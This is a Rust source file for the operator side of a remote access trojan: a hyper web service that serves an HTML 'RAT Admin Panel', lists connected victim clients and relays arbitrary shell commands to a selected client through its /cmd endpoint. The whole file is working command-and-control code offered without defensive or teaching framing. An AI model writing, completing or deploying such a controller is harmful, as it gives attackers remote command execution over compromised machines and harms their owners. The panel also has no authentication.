use std::net::SocketAddr;
use std::pin::Pin;
use std::sync::{LazyLock, Weak};

use http_body_util::{BodyExt, Full};
use hyper::body::{Bytes, Incoming};
use hyper::service::Service;
use hyper::{Method, Request, Response};
use serde::{Deserialize, Serialize};

use crate::modules::server::Server;

#[derive(Debug, Deserialize)]
struct CommandRequest {
    client: SocketAddr,
    command: String,
}

#[derive(Debug, Serialize)]
struct CommandResponse {
    stdout: String,
    stderr: String,
    exit_code: i32,
}

pub struct AdminService {
    _server: Weak<Server>,
}

impl AdminService {
    pub fn new(server: Weak<Server>) -> Self {
        Self { _server: server }
    }
}

static HTTP_400: LazyLock<Response<Full<Bytes>>> = LazyLock::new(|| {
    Response::builder()
        .status(400)
        .body(Full::new(Bytes::from_static(b"Bad Request")))
        .unwrap()
});

static HTTP_404: LazyLock<Response<Full<Bytes>>> = LazyLock::new(|| {
    Response::builder()
        .status(404)
        .body(Full::new(Bytes::from_static(b"Not Found")))
        .unwrap()
});

static HTTP_405: LazyLock<Response<Full<Bytes>>> = LazyLock::new(|| {
    Response::builder()
        .status(405)
        .body(Full::new(Bytes::from_static(b"Method Not Allowed")))
        .unwrap()
});

static HTTP_503: LazyLock<Response<Full<Bytes>>> = LazyLock::new(|| {
    Response::builder()
        .status(503)
        .body(Full::new(Bytes::from_static(b"Service Unavailable")))
        .unwrap()
});

static HTTP_504: LazyLock<Response<Full<Bytes>>> = LazyLock::new(|| {
    Response::builder()
        .status(504)
        .body(Full::new(Bytes::from_static(b"Gateway Timeout")))
        .unwrap()
});

static INDEX_HTML: &str = r#"<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RAT Admin Panel</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #1a1a2e;
            color: #eee;
            min-height: 100vh;
            padding: 20px;
        }
        .container { max-width: 1200px; margin: 0 auto; }
        h1 {
            color: #0f0;
            margin-bottom: 20px;
            text-shadow: 0 0 10px #0f0;
        }
        .panel {
            background: #16213e;
            border-radius: 8px;
            padding: 20px;
            margin-bottom: 20px;
            border: 1px solid #0f3460;
        }
        .panel h2 {
            color: #e94560;
            margin-bottom: 15px;
            font-size: 1.2em;
        }
        .clients-list {
            display: flex;
            flex-wrap: wrap;
            gap: 10px;
        }
        .client-btn {
            background: #0f3460;
            border: 2px solid #0f3460;
            color: #eee;
            padding: 10px 20px;
            border-radius: 5px;
            cursor: pointer;
            transition: all 0.3s;
        }
        .client-btn:hover { background: #1a4a7a; }
        .client-btn.selected {
            border-color: #0f0;
            box-shadow: 0 0 10px #0f0;
        }
        .command-input {
            display: flex;
            gap: 10px;
            margin-bottom: 15px;
        }
        .command-input input {
            flex: 1;
            background: #0f3460;
            border: 1px solid #1a4a7a;
            color: #eee;
            padding: 12px;
            border-radius: 5px;
            font-family: 'Consolas', monospace;
            font-size: 14px;
        }
        .command-input input:focus {
            outline: none;
            border-color: #0f0;
        }
        .command-input button {
            background: #e94560;
            border: none;
            color: #fff;
            padding: 12px 25px;
            border-radius: 5px;
            cursor: pointer;
            font-weight: bold;
            transition: background 0.3s;
        }
        .command-input button:hover { background: #ff6b6b; }
        .command-input button:disabled {
            background: #555;
            cursor: not-allowed;
        }
        .output {
            background: #0a0a15;
            border-radius: 5px;
            padding: 15px;
            font-family: 'Consolas', monospace;
            font-size: 13px;
            white-space: pre-wrap;
            word-break: break-all;
            max-height: 400px;
            overflow-y: auto;
        }
        .output .stdout { color: #0f0; }
        .output .stderr { color: #ff6b6b; }
        .output .info { color: #888; }
        .output .cmd { color: #0ff; }
        .status {
            display: inline-block;
            padding: 3px 8px;
            border-radius: 3px;
            font-size: 12px;
            margin-left: 10px;
        }
        .status.online { background: #0f0; color: #000; }
        .status.offline { background: #f00; color: #fff; }
        .refresh-btn {
            background: #0f3460;
            border: none;
            color: #eee;
            padding: 8px 15px;
            border-radius: 5px;
            cursor: pointer;
            margin-left: 10px;
        }
        .refresh-btn:hover { background: #1a4a7a; }
        .no-clients { color: #888; font-style: italic; }
        .history { margin-top: 10px; }
    </style>
</head>
<body>
    <div class="container">
        <h1>🖥️ RAT Admin Panel</h1>
        
        <div class="panel">
            <h2>Connected Clients <button class="refresh-btn" onclick="refreshClients()">🔄 Refresh</button></h2>
            <div id="clients" class="clients-list">
                <span class="no-clients">Loading...</span>
            </div>
        </div>
        
        <div class="panel">
            <h2>Remote Command Execution</h2>
            <div class="command-input">
                <input type="text" id="command" placeholder="Enter command..." onkeypress="if(event.key==='Enter')executeCommand()">
                <button id="execBtn" onclick="executeCommand()">Execute</button>
            </div>
            <div class="output" id="output"><span class="info">Select a client and enter a command to execute.</span></div>
        </div>
    </div>

    <script>
        let selectedClient = null;
        let commandHistory = [];

        async function refreshClients() {
            try {
                const resp = await fetch('/clients');
                const clients = await resp.json();
                const container = document.getElementById('clients');
                
                if (clients.length === 0) {
                    container.innerHTML = '<span class="no-clients">No clients connected</span>';
                    selectedClient = null;
                    return;
                }
                
                container.innerHTML = clients.map(client => `
                    <button class="client-btn ${selectedClient === client ? 'selected' : ''}" 
                            onclick="selectClient('${client}')">
                        ${client} <span class="status online">ONLINE</span>
                    </button>
                `).join('');
                
                if (selectedClient && !clients.includes(selectedClient)) {
                    selectedClient = null;
                }
            } catch (e) {
                document.getElementById('clients').innerHTML = 
                    '<span class="no-clients">Error loading clients</span>';
            }
        }

        function selectClient(client) {
            selectedClient = client;
            document.querySelectorAll('.client-btn').forEach(btn => {
                btn.classList.toggle('selected', btn.textContent.includes(client));
            });
            appendOutput(`\n<span class="info">Selected client: ${client}</span>\n`);
        }

        async function executeCommand() {
            const cmdInput = document.getElementById('command');
            const command = cmdInput.value.trim();
            
            if (!selectedClient) {
                appendOutput('<span class="stderr">Error: No client selected</span>\n');
                return;
            }
            if (!command) {
                appendOutput('<span class="stderr">Error: No command entered</span>\n');
                return;
            }

            const btn = document.getElementById('execBtn');
            btn.disabled = true;
            btn.textContent = 'Executing...';
            
            appendOutput(`<span class="cmd">${selectedClient}> ${escapeHtml(command)}</span>\n`);
            cmdInput.value = '';

            try {
                const resp = await fetch('/cmd', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ client: selectedClient, command: command })
                });
                
                if (!resp.ok) {
                    appendOutput(`<span class="stderr">HTTP Error: ${resp.status}</span>\n`);
                    return;
                }
                
                const result = await resp.json();
                
                if (result.stdout) {
                    appendOutput(`<span class="stdout">${escapeHtml(result.stdout)}</span>`);
                }
                if (result.stderr) {
                    appendOutput(`<span class="stderr">${escapeHtml(result.stderr)}</span>`);
                }
                appendOutput(`<span class="info">[Exit code: ${result.exit_code}]</span>\n\n`);
                
            } catch (e) {
                appendOutput(`<span class="stderr">Error: ${e.message}</span>\n`);
            } finally {
                btn.disabled = false;
                btn.textContent = 'Execute';
            }
        }

        function appendOutput(html) {
            const output = document.getElementById('output');
            if (output.querySelector('.info')?.textContent.includes('Select a client')) {
                output.innerHTML = '';
            }
            output.innerHTML += html;
            output.scrollTop = output.scrollHeight;
        }

        function escapeHtml(text) {
            const div = document.createElement('div');
            div.textContent = text;
            return div.innerHTML;
        }

        // Initial load and auto-refresh
        refreshClients();
        setInterval(refreshClients, 5000);
    </script>
</body>
</html>
"#;

impl Service<Request<Incoming>> for AdminService {
    type Response = Response<Full<Bytes>>;
    type Error = hyper::http::Error;
    type Future = Pin<Box<dyn Future<Output = Result<Self::Response, Self::Error>> + Send>>;

    fn call(&self, request: Request<Incoming>) -> Self::Future {
        let server: Weak<Server> = self._server.clone();
        Box::pin(async move {
            let response = match request.uri().path() {
                "/" => match request.method() {
                    &Method::GET => Response::builder()
                        .status(200)
                        .header("Content-Type", "text/html; charset=utf-8")
                        .body(Full::new(Bytes::from_static(INDEX_HTML.as_bytes())))?,
                    _ => HTTP_405.clone(),
                },
                "/clients" => match request.method() {
                    &Method::GET => match server.upgrade() {
                        Some(server) => {
                            let clients = server.list_clients().await;
                            let body = serde_json::to_vec(&clients).unwrap_or_default();
                            Response::builder()
                                .status(200)
                                .body(Full::new(body.into()))?
                        }
                        None => HTTP_503.clone(),
                    },
                    _ => HTTP_405.clone(),
                },
                "/cmd" => match request.method() {
                    &Method::POST => match server.upgrade() {
                        Some(server) => {
                            let body = request.collect().await;
                            let body = match body {
                                Ok(b) => b.to_bytes(),
                                Err(_) => return Ok(HTTP_400.clone()),
                            };

                            let cmd_req: CommandRequest = match serde_json::from_slice(&body) {
                                Ok(r) => r,
                                Err(_) => return Ok(HTTP_400.clone()),
                            };

                            match server.send_command(cmd_req.client, cmd_req.command).await {
                                Some(rat_common::messages::ClientMessage::CommandResult {
                                    stdout,
                                    stderr,
                                    exit_code,
                                    ..
                                }) => {
                                    let resp = CommandResponse { stdout, stderr, exit_code };
                                    let body = serde_json::to_vec(&resp).unwrap_or_default();
                                    Response::builder()
                                        .status(200)
                                        .header("Content-Type", "application/json")
                                        .body(Full::new(body.into()))?
                                }
                                _ => HTTP_504.clone(),
                            }
                        }
                        None => HTTP_503.clone(),
                    },
                    _ => HTTP_405.clone(),
                },
                _ => HTTP_404.clone(),
            };

            Ok(response)
        })
    }
}
